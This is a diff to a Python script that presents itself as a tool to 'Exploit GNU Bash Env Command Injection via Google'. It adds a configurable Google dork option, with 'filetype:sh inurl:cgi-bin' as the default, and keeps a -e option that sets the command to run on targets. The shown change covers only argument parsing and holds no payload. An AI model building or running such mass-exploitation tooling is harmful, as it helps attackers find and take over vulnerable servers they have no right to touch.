@@ -65,25 +65,28 @@ class Google(threading.Thread):
 
 
 
-USAGE = "python kbash.py -t thread_count -c page_count -e command"
+USAGE = "exp -t thread -c page_count -e command"
 DESC  = "Exploit GNU Bash Env Command Injection via Google. \n code by kingx  -   http://cih.so"
 epilog = "License, requests, etc: https://github.com/KxCode"
 parser = argparse.ArgumentParser(usage=USAGE, description=DESC, epilog=epilog)
 parser.add_argument('-t', dest='thread_count',
 					type=int,
-                    help="Thread Count",
+                    help="thread count",
                     default=4)
 parser.add_argument('-c', dest='page_count',
 					type=int,
-                    help="Google Page Count",
+                    help="google page count",
                     default=1)
+parser.add_argument('-d', dest='dork',
+                    help="Custom Google Dork",
+                    default="filetype:sh inurl:cgi-bin")
 parser.add_argument('-e', dest='cmd',
                     help="Command to Execute",
                     default="whoami")
 args = parser.parse_args()
 
 
-dork = "filetype:sh inurl:cgi-bin"
+dork = args.dork
 
 payload = Google(dork, args.page_count)
 print "Google Searching..."
